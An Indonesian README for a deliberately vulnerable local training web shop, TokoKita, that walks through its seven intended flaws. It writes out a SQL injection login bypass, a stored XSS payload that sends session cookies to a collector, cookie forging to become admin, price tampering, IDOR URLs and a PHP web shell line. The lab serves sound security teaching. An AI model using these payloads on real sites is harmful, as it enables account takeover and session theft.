# TokoKita — Lab Web Rawan (demo serangan)

> **PERINGATAN.** Aplikasi ini **sengaja dibuat rentan** untuk demo/latihan berizin.
> Jangan pakai data asli atau password yang digunakan di tempat lain. Instalasi lokal
> default hanya bind ke `127.0.0.1`; deployment publik demo hanya untuk aplikasi
> TokoKita dan tetap tidak boleh dipakai menyerang infrastruktur hosting/pihak lain.
> Shell PHP di folder `uploads/` **hanya simulasi** — tidak ada perintah sistem
> yang benar-benar dijalankan.

## Lihat di web

- **Demo online (aplikasi):** <https://tokokita-web-production.up.railway.app/> — toko demo yang sudah jalan, bisa dibuka dari browser mana saja.
- **Preview web README:** <https://muse.ai/s/readme-tokokita-hv6xeo40xu3jxf/yv595U8wVbWZfT3trZ8dYW3T_wKQUXEiBRg_e0ZWw7E> — halaman web README ini, dengan preview live demo TokoKita di dalamnya.
- **Runbook lengkap (tampilan web):** [docs/runbook.md di GitHub](https://github.com/TheFoolByte/tokokita-web/blob/main/docs/runbook.md) — panduan demo dari ujung ke ujung, dibaca langsung di browser.
- **Panduan teknis presenter/penguji:** [`docs/demo-runbook.md`](docs/demo-runbook.md)

Toko online multi-halaman (HTML/CSS/JS) + backend Python stdlib + SQLite.
Celahnya nyata di sisi server, jadi bisa didemokan lewat browser maupun Burp Suite.

## Cara menjalankan

```bash
python3 server.py
```

Buka <http://127.0.0.1:8000>. Tidak perlu install apa pun (Python 3.10+).

- Ganti port: `python3 server.py --port 8080`
- Demo dua laptop di jaringan privat milik tim saja: `python3 server.py --host 0.0.0.0`, lalu akses `http://<IP-laptop-kamu>:8000`. Jangan expose port ini ke jaringan publik.
- Reset data demo lokal: hentikan server, hapus `tokokita.db`, `tokokita-lab.db` dan isi `uploads/`, lalu jalankan ulang.
- Cek cepat semua celah: `python3 tests/smoke_test.py`
- Panduan teknis presenter/penguji: [`docs/demo-runbook.md`](docs/demo-runbook.md)
- Panduan non-teknis untuk Kamila: [`docs/runbook.md`](docs/runbook.md)

Server mengirim header `Apache/2.4.41` + `X-Powered-By: PHP/7.4.3` supaya hasil
`nmap`/`curl` konsisten dengan cerita "aplikasi PHP lama".

## Akun demo

| Peran | Username | Password |
| --- | --- | --- |
| Admin/pemilik | `kamila` | `kamila123` |
| Pembeli utama | `rohandhika` | `rohandhika123` |
| Pembeli dummy | `sari`, `jun`, `budi`, `maya`, `dimas`, `nina`, `raka`, `lila`, `fajar`, `dewi` | lihat [`docs/demo-runbook.md`](docs/demo-runbook.md) |

Semua 12 akun/credential adalah fixture demo sintetis; jangan pakai password ini di layanan lain.

Pesanan seed: `#101`, `#102` (Rohandhika), `#201` (Kamila), `#202`, `#203` (Sari Dewi).

## Struktur

```
tokokita-web/
├── index.html, pages/, css/, assets/   # frontend (desain tidak diubah)
├── js/
│   ├── data.js      # katalog 42 produk (tetap di browser)
│   ├── auth.js      # login/register/logout ke API
│   └── app.js       # ulasan, checkout, pesanan, upload, dashboard
├── server.py        # backend + sengaja rentan
├── tests/smoke_test.py
├── uploads/         # hasil unggahan (dibuat otomatis)
└── tokokita.db      # SQLite (dibuat otomatis, seed di server.py)
```

## Celah yang disengaja

**6 kategori, 7 adegan.** SQL Injection tampil dua kali (login + lab sqlmap); sesi lemah adalah kategori sendiri, bukan bagian dari XSS. Urutan rundown resmi 12 menit: **harga Rp100 → IDOR order #201 → SQLi login → sqlmap lab → Stored XSS + collector → upload/shell simulasi → mitigasi + reset**.

### 1. SQL injection — bypass login

Halaman Masuk, isi:

- Username: `' OR '1'='1`
- Password: bebas (mis. `apa-saja`)

Query server menyambung input langsung:

```sql
SELECT ... FROM users WHERE password = '<pass>' AND username = '<user>'
```

`' OR '1'='1` membuat kondisi selalu benar; baris pertama = `kamila` (admin).
Di Burp, request-nya `POST /api/login` dengan body JSON. Payload rusak akan
membocorkan pesan `SQL error: ...` di response (error-based SQLi).

### 2. Stored XSS — curi cookie sesi admin

Cookie `PHPSESSID` sengaja **tanpa `HttpOnly`**, dan ulasan dirender dengan
`innerHTML` tanpa escape. Kirim ulasan di halaman produk:

```html
<img src=x onerror="fetch('/api/collect?c='+encodeURIComponent(document.cookie))">
```

Saat Kamila membuka produk itu, cookie-nya terkirim ke halaman penyerang:
<http://127.0.0.1:8000/collector>

Tempel nilai cookie yang masuk ke DevTools → *Storage/Application → Cookies*
(atau lewat Console), reload, lalu buka **Dashboard Penjual**. Ganti nama toko
jadi `TOKO DIHACK` — perubahan tersimpan di server.

Jalur cadangan kalau XSS gagal saat live (cookie `user` dipercaya apa adanya):

```js
document.cookie = "user=kamila; path=/";
location.reload();
```

### 3. Sesi lemah — cookie dipercaya apa adanya

Cookie `PHPSESSID` sengaja **tanpa `HttpOnly`** (bisa dibaca JavaScript), dan — ini kategori sendiri, bukan bagian dari XSS — server juga **percaya begitu saja pada cookie `user`** sebagai identitas, tanpa memeriksa token apa pun. Jadi siapa pun bisa jadi admin tanpa password dan tanpa mencuri apa pun:

```js
document.cookie = "user=kamila; path=/";
location.reload();
```

Adegan ini menyatu dengan adegan Stored XSS (kategori 2): cookie admin yang tercuri lewat XSS dikirim ke `/collector`, dan jalur cookie `user` ini adalah cadangan kalau XSS gagal saat live.

### 4. Harga checkout dari client

Halaman pembayaran menyimpan harga di hidden input `priceField<id>`. Lewat
Inspect, ubah `value="8999000"` jadi `value="100"`, lalu bayar. Request
`POST /api/checkout` mengirim harga itu dan server memakainya apa adanya:

```
Total yang dibayar: Rp 100
```

### 5. IDOR — intip pesanan orang lain

Login sebagai `rohandhika`, buka:

```
http://127.0.0.1:8000/pages/orders.html?id=201
```

Langsung tampil pesanan Kamila (alamat `Jl. Merdeka No. 45, Medan`). Ganti ke
`?id=202` untuk pesanan Sari Dewi. Endpoint `GET /api/orders/<id>` tidak
mengecek pemilik.

### 6. Upload file → shell PHP (simulasi)

Di halaman Profil, unggah file bernama `shell.php` (isi bebas, misalnya
`<?php system($_GET['cmd']); ?>` — **tidak akan dieksekusi**). Server tidak
memvalidasi ekstensi. Buka:

```
http://127.0.0.1:8000/uploads/shell.php?cmd=whoami
```

Muncul tampilan shell dengan output palsu (`www-data`, `ls`, `cat .env`, dst.).
Semua output di-hardcode di `SHELL_OUTPUTS` pada `server.py`; tidak ada
`os.system`/`exec`.

### 7. SQL injection — katalog fixture khusus sqlmap

Endpoint `GET /api/lab/search?category=electronics` sengaja rentan, tetapi memakai
file DB terpisah `tokokita-lab.db` yang hanya berisi empat produk dummy. Endpoint
hanya menjalankan `SELECT`, membatasi hasil, serta membatasi input 4096 karakter;
ia tidak mengakses akun, pesanan, ulasan, atau data penjual. Untuk langkah uji lokal yang dibatasi, lihat
[`docs/demo-runbook.md`](docs/demo-runbook.md). Jangan gunakan opsi dump atau shell.

## Endpoint backend

| Method | Path | Keterangan |
| --- | --- | --- |
| POST | `/api/login` | **SQLi** |
| POST | `/api/register` | daftar akun |
| POST | `/api/logout` | hapus sesi |
| GET | `/api/me` | user yang sedang login |
| GET | `/api/reviews?pid=1` | ulasan (**XSS**) |
| POST | `/api/reviews` | simpan ulasan mentah |
| POST | `/api/checkout` | **harga dari client** |
| GET | `/api/orders/mine` | pesanan milik sendiri |
| GET | `/api/orders/<id>` | **IDOR** |
| GET | `/api/seller/summary` | admin: semua pesanan + nama toko |
| GET | `/api/prices` | harga override dari penjual |
| GET | `/api/lab/search?category=...` | **SQLi lab**, DB fixture terpisah |
| POST | `/api/seller/price` | admin: ubah harga produk (persist) |
| POST | `/api/seller/store` | admin: ubah nama toko |
| POST | `/api/seller/reset` | admin: pulihkan data seed |
| POST | `/api/upload?name=...` | **upload tanpa validasi** |
| GET | `/api/collect?c=...` | penampung cookie XSS (1×1 GIF) |
| GET | `/collector` | halaman "laptop penyerang" |

Sesi disimpan di memori: restart server = login ulang. Akun/pesanan/ulasan
disimpan di `tokokita.db`.
